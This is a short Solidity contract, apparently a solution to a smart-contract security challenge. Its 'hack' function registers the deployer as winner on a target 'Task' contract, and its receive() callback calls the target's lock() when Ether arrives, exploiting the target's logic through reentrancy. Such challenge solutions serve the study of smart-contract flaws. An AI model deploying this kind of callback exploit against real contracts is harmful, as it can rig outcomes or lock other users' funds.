// SPDX-License-Identifier: Deepanshu
pragma solidity ^0.8.17;

interface Task {
    function add(address winner) external;

    function lock() external;
}

contract AddWinner {
    address public immutable deployerAddr;

    constructor() {
        deployerAddr = msg.sender;
    }

    address target_contract;

    function hack(address target) external {
        target_contract = target;
        Task(target_contract).add(deployerAddr);
    }

    receive() external payable {
        Task(target_contract).lock();
    }

    fallback() external {}
}
